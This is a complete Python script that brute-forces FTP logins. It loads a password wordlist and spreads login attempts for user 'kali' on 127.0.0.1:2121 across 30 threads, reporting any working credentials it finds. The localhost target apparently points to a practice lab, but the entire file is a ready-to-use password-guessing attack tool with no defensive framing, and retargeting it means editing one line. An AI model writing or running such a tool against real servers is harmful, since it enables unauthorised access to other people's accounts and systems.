import ftplib
from threading import Thread
import queue
from colorama import init, Fore

init(autoreset=True)   # makes colors reset automatically

q = queue.Queue()
n_threads = 30
host = '127.0.0.1'
user = 'kali'
port = 2121

found = False  # track if credentials were found


def connect_ftp():
    global q, found
    while not q.empty() and not found:  # stop if queue is empty or creds found
        password = q.get()
        print(f'[!] Trying: {password}')
        try:
            server = ftplib.FTP()
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")
        else:
            print(f"{Fore.GREEN}[+] Found credentials:")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            found = True
        finally:
            q.task_done()


# Load passwords
try:
    with open('wordlist.txt', 'r', encoding='utf-8') as f:
        passwords = f.read().split('\n')
except FileNotFoundError:
    print(f"{Fore.RED}[-] Wordlist file not found!{Fore.RESET}")
    exit(1)

print(f'[+] Passwords to try: {len(passwords)}')

# Fill queue
for password in passwords:
    q.put(password)

# Start threads
threads = []
for _ in range(n_threads):
    t = Thread(target=connect_ftp)  # <-- no daemon
    t.start()
    threads.append(t)

# Wait until all tasks done
q.join()

# Wait for all threads to finish properly
for t in threads:
    t.join()

if not found:
    print(f"{Fore.RED}[-] No valid credentials found{Fore.RESET}")
